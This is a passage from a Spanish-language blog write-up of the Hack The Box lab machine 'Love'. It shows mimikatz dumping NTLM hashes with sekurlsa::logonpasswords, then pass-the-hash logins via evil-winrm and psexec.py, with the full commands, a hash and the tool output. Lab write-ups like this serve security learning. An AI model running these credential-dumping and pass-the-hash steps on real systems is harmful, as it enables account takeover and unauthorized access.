 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
```

Ahora, si queremos intentar ver las contraseñas en texto plano (o al menos los hashes **NTLM**) escribimos:

```powershell
mimikatz # sekurlsa::logonpasswords
```

Nos respondería con info de los usuarios, en este caso de **Phoebe** y **Administrator**:

**Phoebe:**

![344bash_win_mimi_lsa_phoebe](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_win_mimi_lsa_phoebe.png)

**Administrator:**

![344bash_win_mimi_lsa_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_win_mimi_lsa_admin.png)

Vemos los hashes **NTLM** pero no las contraseñas en texto plano, aunque nos da igual, ya que podemos hacer mucho con simplemente los hashes, como por ejemplo entablarnos una **PowerShell** con ayuda de **evil-winrm** o **psexec.py** como cualquiera de los dos usuarios:

### Pass-The-Hash - evil-winrm [🔗](#post-privesc-pth-winrm) {#post-privesc-pth-winrm}

Por ejemplo para el usuario **Phoebe** tomaríamos su hash y escribiríamos:

```bash
❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -H a9ccd3a011ceb45b44ce6f6b40122268
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y haríamos lo mismo con el usuario **Administrator** (con el que realmente no nos sabemos su contraseña):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

😜 🥴 😵

### Pass-The-Hash - psexec.py [🔗](#post-privesc-pth-psexec) {#post-privesc-pth-psexec}

Es igual de sencillo, solo que esta vez nos lo permitió solo con el usuario **Administrator**:

**Phoebe**:

```bash
❱ psexec.py -hashes :a9ccd3a011ceb45b44ce6f6b40122268 Phoebe@10.10.10.239
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.239.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

**Administrator**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_psexec_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Y así conseguiríamos una Shell sin necesidad de contraseñas e incluso sin necesidad de explotación alguna, simplemente con el hash **NTLM** identificador del usuario (:

Podemos hacer más cositas guapas con **mimikatz**, pero eso ya se los dejo de investigación :P

...

No me llamo tanto la atención el encontrar la contraseña de **Phoebe** en una página web así de la nada, pero de resto estuvo lindo el camino.

Y una vez más están volviendo a poner máquinas que si son sencillitas, esas que incentivan a la gente y no les hace explotar la cabeza tan deprisa jajaj, así que gracias **HTB**.

La escalada no la había hecho y me pareció interesante, no sé que tan frecuente se ve eso en realidad, pero bueno, existe...

Bueno, nos leeremos después, a seguir disfrutando de la vida y a seguir rompiendo todo!! Bless <3